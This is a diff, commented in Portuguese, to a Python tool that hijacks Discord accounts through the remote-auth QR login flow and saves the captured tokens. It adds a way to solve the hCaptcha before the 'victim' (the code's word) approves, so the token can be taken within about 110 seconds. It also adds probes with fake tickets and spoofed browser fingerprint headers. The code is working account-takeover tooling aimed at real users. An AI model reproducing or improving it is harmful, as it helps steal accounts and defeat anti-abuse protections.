@@ -43,6 +43,10 @@ TOKENS_FILE = "tokens.txt"
 
 CAPTCHAS = {}   # sid -> {ticket, sitekey, rqdata, session}
 
+# captcha PRE-ARMADO: resolvido antes da vitima aprovar
+ARMED = {"key": None, "ekey": "", "ts": 0}
+ARM_LOCK = threading.Lock()
+
 
 def lan_ip():
     try:
@@ -130,6 +134,22 @@ class RemoteAuthSession(threading.Thread):
               flush=True)
         if r.status_code != 200:
             print("BODY:", r.text[:250], flush=True)
+        if captcha_key and r.status_code != 200:
+            print(f"CAPTCHA_USED key_len={len(captcha_key)} "
+                  f"ekey_len={len(captcha_rqtoken or '')}", flush=True)
+            # DIAGNOSTICO: mesmo captcha com ticket falso. Se a resposta
+            # for "invalid ticket" (e nao captcha-required), o captcha FOI
+            # aceito e o problema e o ticket real ter expirado.
+            try:
+                r2 = s.post(
+                    "https://discord.com/api/v9/users/@me/remote-auth/login",
+                    json={"ticket": "diag-probe",
+                          "captcha_key": captcha_key,
+                          "captcha_rqtoken": captcha_rqtoken or ""},
+                    headers={"X-Track": fp} if fp else {}, timeout=20)
+                print("DIAG:", r2.status_code, r2.text[:200], flush=True)
+            except Exception as e:
+                print("DIAG_ERR:", repr(e)[:120], flush=True)
         return r
 
     def finish_token(self, r):
@@ -242,10 +262,23 @@ class RemoteAuthSession(threading.Thread):
         elif op == "pending_login":
             ticket = m["ticket"]
             self.state = "captcha"   # enquanto tenta a troca
-            print("[sessao] ticket recebido, trocando...", flush=True)
-            # em thread separada p/ nao travar o ws (heartbeat continua)
-            threading.Thread(target=self.try_exchange,
-                             args=(ticket,), daemon=True).start()
+            # usa captcha pre-armado se estiver fresco (<110s)
+            armed_key = armed_ekey = None
+            with ARM_LOCK:
+                if ARMED["key"] and time.time() - ARMED["ts"] < 110:
+                    armed_key = ARMED["key"]
+                    armed_ekey = ARMED["ekey"]
+                    ARMED["key"] = None   # consome
+            if armed_key:
+                print("[sessao] captcha pre-armado — trocando direto",
+                      flush=True)
+                threading.Thread(target=self.try_exchange,
+                                 args=(ticket, armed_key, armed_ekey, 1),
+                                 daemon=True).start()
+            else:
+                print("[sessao] ticket recebido, trocando...", flush=True)
+                threading.Thread(target=self.try_exchange,
+                                 args=(ticket,), daemon=True).start()
 
         elif op == "cancel":
             self.state = "cancelled"
@@ -506,26 +539,61 @@ p{color:#b9a7d8;font-size:14px}
 """
 
 
-def captcha_page(sid, sitekey, rqdata):
+def arm_probe():
+    """Pede um captcha com ticket falso so p/ obter sitekey+rqdata."""
+    sp = base64.b64encode(json.dumps({
+        "os": "Windows", "browser": "Chrome", "device": "",
+        "system_locale": "en-US", "browser_user_agent": UA,
+        "browser_version": "132.0.0.0", "os_version": "10",
+        "referrer": "", "referring_domain": "", "referrer_current": "",
+        "referring_domain_current": "", "release_channel": "stable",
+        "client_build_number": 363557, "client_event_source": None,
+    }).encode()).decode()
+    try:
+        s = requests.Session()
+        s.headers.update({
+            "User-Agent": UA,
+            "Content-Type": "application/json",
+            "Origin": "https://discord.com",
+            "Referer": "https://discord.com/login",
+            "X-Discord-Locale": "en-US",
+            "X-Discord-Timezone": "UTC",
+            "X-Super-Properties": sp,
+        })
+        fp = s.get("https://discord.com/api/v9/experiments",
+                   timeout=20).json().get("fingerprint")
+        r = s.post("https://discord.com/api/v9/users/@me/remote-auth/login",
+                   json={"ticket": "arm-probe"},
+                   headers={"X-Track": fp} if fp else {}, timeout=20)
+        j = r.json()
+        return (j.get("captcha_sitekey") or
+                "a9b5fb07-92ff-493f-86fe-352a2803b3df",
+                j.get("captcha_rqdata") or "")
+    except Exception:
+        return ("a9b5fb07-92ff-493f-86fe-352a2803b3df", "")
+
+
+def captcha_page(sid, sitekey, rqdata, arm=False):
+    endpoint = "/api/arm" if arm else "/api/captcha"
     return f"""<!DOCTYPE html><html><head><meta charset="utf-8">
 <title>Verificacao</title>
 <script src="https://js.hcaptcha.com/1/api.js?render=explicit" async defer></script>
 </head><body style="background:#0d0221;color:#fff;font-family:Arial;
 display:flex;justify-content:center;align-items:center;height:100vh;margin:0">
 <div style="text-align:center">
-<h2>Verifique para concluir o login</h2>
+<h2>{'Pre-armar captcha' if arm else 'Verifique para concluir o login'}</h2>
 <div id="hcap"></div>
 <div id="res" style="margin-top:14px;font-size:14px"></div>
 </div>
 <script>
 // o callback do hCaptcha entrega (token, ekey) — o ekey e o captcha_rqtoken
 function done(key, ekey){{
-  fetch('/api/captcha', {{method:'POST',
+  fetch('{endpoint}', {{method:'POST',
     headers: {{'Content-Type':'application/json'}},
     body: JSON.stringify({{sid:'{sid}', key:key, ekey:(ekey||'')}})}})
    .then(r=>r.json())
    .then(j=>{{ document.getElementById('res').textContent =
-       j.ok ? 'OK! captcha aceito — pode fechar esta aba.' :
+       j.ok ? 'OK! ' + (j.armado or 'captcha aceito — pode fechar esta aba.') :
               'falhou: '+JSON.stringify(j); }});
 }}
 function tryRender(){{
@@ -599,8 +667,16 @@ class Handler(BaseHTTPRequestHandler):
                 f"<li><a href='/captcha/{s}'>/captcha/{s}</a></li>"
                 for s in CAPTCHAS)
             self._html(
-                "<h2>Captchas pendentes</h2><ul>" + items + "</ul>"
-                if items else "<h2>Nenhum captcha pendente</h2>")
+                "<h2>Captchas pendentes</h2><ul>" + items + "</ul>" +
+                "<p><a href='/arm'>⚡ Pre-armar captcha</a> "
+                "(resolva ANTES da vitima aprovar — janela de ~110s)</p>"
+                if items else
+                "<h2>Nenhum captcha pendente</h2>"
+                "<p><a href='/arm'>⚡ Pre-armar captcha</a> "
+                "(resolva ANTES da vitima aprovar — janela de ~110s)</p>")
+        elif u.path == "/arm":
+            sitekey, rqdata = arm_probe()
+            self._html(captcha_page("ARM", sitekey, rqdata, arm=True))
         elif u.path.startswith("/captcha/"):
             sid = u.path.split("/")[-1]
             c = CAPTCHAS.get(sid)
@@ -653,6 +729,19 @@ class Handler(BaseHTTPRequestHandler):
                              args=(c["ticket"], key, ekey, 1),
                              daemon=True).start()
             self._json({"ok": True})
+        elif u.path == "/api/arm":
+            key = data.get("key")
+            ekey = data.get("ekey", "")
+            if not key:
+                self._json({"ok": False, "erro": "sem chave"})
+                return
+            with ARM_LOCK:
+                ARMED["key"] = key
+                ARMED["ekey"] = ekey
+                ARMED["ts"] = time.time()
+            print("[arm] captcha pre-armado! valido por ~110s", flush=True)
+            self._json({"ok": True,
+                        "armado": "armado! faca a vitima aprovar em ate 110s"})
         else:
             self._json({"error": "not found"}, 404)
 
